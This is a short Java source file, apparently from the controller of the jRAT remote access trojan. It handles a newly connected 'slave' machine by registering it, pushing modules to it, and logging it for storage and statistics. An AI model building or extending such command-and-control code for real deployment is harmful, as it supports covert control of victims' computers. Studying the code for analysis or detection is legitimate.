package jrat.controller.packets.incoming;

import jrat.controller.OfflineSlave;
import jrat.controller.Slave;
import jrat.controller.modules.ModuleLoader;
import jrat.controller.net.ConnectionHandler;
import jrat.controller.settings.StatisticsOperatingSystem;
import jrat.controller.settings.StoreOfflineSlaves;

public class Packet3Initialized implements IncomingPacket {

	@Override
	public void read(final Slave slave) throws Exception {
		ConnectionHandler.addSlave(slave);

		if (slave.getProtocolVersion() >= 7) {
            ModuleLoader.sendAll(slave);
        }

        StoreOfflineSlaves.getGlobal().add(new OfflineSlave(slave));
		StatisticsOperatingSystem.getGlobal().add(slave);
	}

}
